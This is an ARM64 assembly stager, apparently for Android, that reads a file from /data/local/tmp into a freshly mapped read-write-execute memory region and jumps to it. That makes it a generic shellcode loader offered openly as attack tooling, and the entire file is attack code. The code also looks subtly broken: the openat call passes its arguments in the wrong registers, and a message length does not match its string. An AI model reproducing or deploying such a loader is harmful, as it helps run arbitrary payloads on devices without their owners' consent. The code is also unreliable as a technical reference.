/*
 * external_payload_fetcher.s - External Payload Fetcher
 *
 * This stager opens "/data/local/tmp/payload.bin", reads up to 128 bytes into an allocated RWX region,
 * and then jumps to the payload.
 */
 
.section .data
payload_path:
    .asciz "/data/local/tmp/payload.bin\0"
msg_open_fail:
    .asciz "Payload open failed\n"
 
.section .text
.global main
main:
    adr x0, payload_path
    mov x1, #0          /* O_RDONLY */
    mov x8, #56         /* open syscall */
    svc 0
    cmp x0, #0
    blt payload_fail
    mov x19, x0         /* FD */
 
    /* Allocate 128 bytes RWX */
    mov x0, 0
    mov x1, #128
    mov x2, #7
    mov x3, #0x22
    mov x4, #-1
    mov x5, 0
    mov x8, #222
    svc 0
    mov x20, x0         /* Pointer to allocated region */
 
    /* Read payload into memory */
    mov x0, x19
    mov x1, x20
    mov x2, #128
    mov x8, #63
    svc 0
 
    /* Close FD */
    mov x0, x19
    mov x8, #57
    svc 0
 
    /* Execute payload */
    mov x0, x20
    br x0
 
payload_fail:
    mov x0, #1
    adr x1, msg_open_fail
    mov x2, #22
    mov x8, #64
    svc 0
    mov x0, #1
    mov x8, #93
    svc 0
